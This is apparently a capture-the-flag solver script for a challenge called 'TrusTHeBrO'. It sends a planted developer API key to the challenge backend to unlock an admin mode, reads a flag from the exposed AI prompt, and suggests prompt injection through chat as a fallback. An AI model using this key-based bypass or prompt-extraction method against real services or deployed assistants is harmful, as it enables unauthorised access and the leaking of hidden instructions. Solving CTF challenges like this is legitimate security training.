#!/usr/bin/env python3
"""TrusTHeBrO solver — asserts the admin branch and extracts the flag.

Requires `requests`. Uses only the public backend endpoint; mirrors the
HTTP-level solve path (stage 3 in SOLUTION.md).
"""
import os
import re
import sys

import requests

URL = os.environ.get("TRUSTHEBRO_URL", "https://function-bun-production-d79f.up.railway.app/")
DEV_KEY = "AIzaSyG3nn1n1-Pr0-4dm1n-K3y-0f-Th3-Br0X"


def prompt_for(key: str) -> str:
    r = requests.get(URL, headers={"x-api-key": key}, timeout=15)
    r.raise_for_status()
    body = r.json()
    return body["mode"], body["prompt"]


def main() -> int:
    assert prompt_for("my-own-gemini-key")[0] == "public", "baseline should be public mode"
    mode, prompt = prompt_for(DEV_KEY)
    assert mode == "admin", "the fake dev key did not unlock admin mode"
    m = re.search(r"ingehack\{[^}]+\}", prompt)
    if not m:
        print("admin mode reached, but no flag in prompt — inject it via chat instead")
        return 1
    print("FLAG:", m.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
